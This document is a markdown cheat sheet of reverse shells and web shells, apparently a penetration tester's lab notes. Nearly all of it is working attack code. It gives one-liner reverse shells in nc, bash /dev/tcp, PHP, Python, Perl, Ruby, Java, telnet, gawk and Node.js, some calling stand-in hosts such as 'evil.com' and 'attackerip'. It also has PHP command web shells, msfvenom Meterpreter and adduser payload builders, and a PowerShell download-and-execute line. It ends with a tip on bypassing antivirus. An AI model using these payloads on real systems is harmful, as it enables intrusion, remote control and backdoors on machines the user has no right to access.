# Webshells


## Windows download & execute

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md


# Listening...

# nc
    nc -e /bin/sh 10.0.0.1 1234

# old nc
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f

# nc variant
    nc -c /bin/sh attackerip 4444
    /bin/sh | nc attackerip 4444
    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p

# nc windows 
    nc.exe -nlvp 443 -e cmd.exe

# Bash
    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    ````
    $ exec 5<>/dev/tcp/evil.com/8080
    $ cat <&5 | while read line; do $line 2>&5 >&5; done
    ````

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

# Php reverse shell
    
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.36/4445 0>&1'"); ?>

# Php cmd shell
    
    <?php echo "Shell: ";system($_GET['cmd']); ?>


# php
    This code assumes that the TCP connection uses file descriptor 3.  If it doesn’t work, try 4, 5, 6…
    php -r '$sock=fsockopen("10.10.14.36",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

    <?php $sock=fsockopen("10.10.14.36",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
    [exploit/php_reverse_shell/php-reverse-shell.php](exploit/php_reverse_shell/php-reverse-shell.php)

    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f");?>

# Python

    - Collection of python TCP/UDP/PTY shells: https://github.com/infodox/python-pty-shells

     os.system('nc 192.168.168.168 443 -e /bin/sh')

     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python udp webshell

    ex: HTB - Koker
    - https://github.com/infodox/python-pty-shells/blob/master/udp_pty_backconnect.py.

    Get iptable (tcp are blocked.. use udp)
    subprocess.check_output(['cat','/etc/iptables/rules.v4'])
    import subprocess; print subprocess.check_output(['iptables','-L'])


    listener (nc wont work) : # socat file:`tty`,echo=0,raw udp-listen:1234

    Reverse udp shell
    import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.18\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])

## python udp reverseshell
    import os; os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u <LAB IP> <PORT> >/tmp/f &").read() 
    nc -nvlp <port> -u


# Perl
    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# Perl windows
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


# Ruby
    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Ruby windows
    ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'



# Kali webshell
    /usr/share/webshells/php/php-reverse-shell.php
    /usr/share/webshells/cfm/cfexec.cfm
    /usr/share/webshells/perl/perl-reverse-shell.pl

# ASP reverse shell : nc
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.168 LPORT=443 -f asp -o shell.asp - also works for exporting .aspx

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=4445 --platform windows -a x86 -e generic/none -f aspx -o reverse_shell.txt


# Windows reverse shell
    echo $secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force > wget-runas.ps1
    echo $mycreds = New-Object System.Management.Automation.PSCredential ("username", $secpasswd) >> wget-runas.ps1
    echo $computer = "hostname" >> wget-runas.ps1
    echo [System.Diagnostics.Process]::Start("C:\tmp\nc.exe","192.168.168.168 443 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer) >> wget-runas.ps1
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget-runas.ps1


# Java

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

# Xterm
    One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

    xterm -display 10.0.0.1:1
    or $ DISPLAY=attackerip:0 xterm

    To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

    Xnest :1

    You’ll need to authorise the target to connect to you (command also run on your host):

    xhost +targetip

    xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
    

# Telnet

    rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p

    telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp

# gawk
````
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
````


# JS shell
```
var net = require('net');
var spawn = require('child_process').spawn;
HOST="10.10.14.139";
PORT="1337";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
```


# PowerShell - Nishang Invoke-PowerShellTcp.ps1
Nishang Powershell - Invoke-PowerShellTcp.ps1
- https://github.com/samratashok/nishang
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

# Generate reverse shell

msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.30 LPORT=4444 R
=> generate perl nc

msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.30 LPORT=4444 R
=> nc in shell

# More to read
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors





## MSFvenom


List payloads
    msfvenom -l

### Binaries Payloads

Linux Meterpreter Reverse Shell
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf

Linux Bind Meterpreter Shell
    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > bind.elf

Linux Bind Shell
    msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > term.elf

Windows Meterpreter Reverse TCP Shell
    staged
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
    stageless
    msfvenom -p windows/meterpreter_reverse_tcp

Windows Reverse TCP Shell
    staged : need msf handler
    msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
    stageless : nc ok
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe > shell2.exe

    
Windows Encoded Meterpreter Windows Reverse Shell
    msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

Mac Reverse Shell
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho

Mac Bind Shell
    msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f macho > bind.macho


### Web Payloads

PHP Meterpreter Reverse TCP
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
    cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php

ASP Meterpreter Reverse TCP
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp

JSP Java Meterpreter Reverse TCP
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp

WAR
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war


exploit/multi/misc/openoffice_document_macro


### Scripting Payloads

Python Reverse Shell
    msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py

Bash Unix Reverse Shell
    msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh

Perl Unix Reverse shell
    msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl

### Shellcode

Windows Meterpreter Reverse TCP Shellcode
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>

Linux Meterpreter Reverse TCP Shellcode
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>

Mac Reverse TCP Shellcode
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>

Create User
    msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe


### Metasploit Handler

    use exploit/multi/handler
    set PAYLOAD <Payload name>
    Set RHOST <Remote IP>
    set LHOST <Local IP>
    set LPORT <Local Port>
    Run


## https://github.com/besimorhino/powercat

- https://github.com/besimorhino/powercat

    IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.3:8000/powercat.ps1')

Serve a cmd Shell:
    powercat -l -p 443 -e cmd

Send a cmd Shell:
    powercat -c 10.1.1.1 -p 443 -e cmd

Serve a shell which executes powershell commands:
    powercat -l -p 443 -ep



# note : bypass AV with Shellter or Veil